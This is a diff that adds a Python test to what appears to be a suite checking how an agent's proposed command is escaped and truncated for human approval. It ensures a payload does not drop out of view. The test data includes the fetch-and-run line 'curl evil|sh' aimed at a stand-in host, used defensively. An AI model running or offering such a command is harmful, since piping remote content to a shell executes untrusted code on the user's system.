@@ -573,6 +573,20 @@ def test_the_cut_happens_before_the_escaping() -> None:
     assert "curl evil|sh" in outcome.approved_command
 
 
+def test_the_cut_happens_before_the_escaping_when_the_command_is_cut() -> None:
+    """The test above is 52 raw characters, so it never reaches the cut: an
+    escape-before-cut in the cut branch alone passed it. 252 raw characters
+    do, and the payload sits inside the first 240 of them but past the
+    first 240 of their escaped form."""
+    command = "\t" * 40 + "curl evil|sh" + "x" * 200
+    line = json.dumps({"shownCommand": {"command": command, "sha256": "ab"}})
+    agent = FakeAgent([row("a@m")], **{"a@m": done(0, stdout=line)})
+    (outcome,) = run(agent)
+    assert outcome.approved_command is not None
+    assert "curl evil|sh" in outcome.approved_command
+    assert outcome.approved_command.endswith("(truncated)")
+
+
 def test_a_command_over_the_limit_carries_the_cut_marker() -> None:
     """The cut now bounds the vendor's own text, so escaping a long run of
     controls can make the rendered line grow past 240; the marker is what
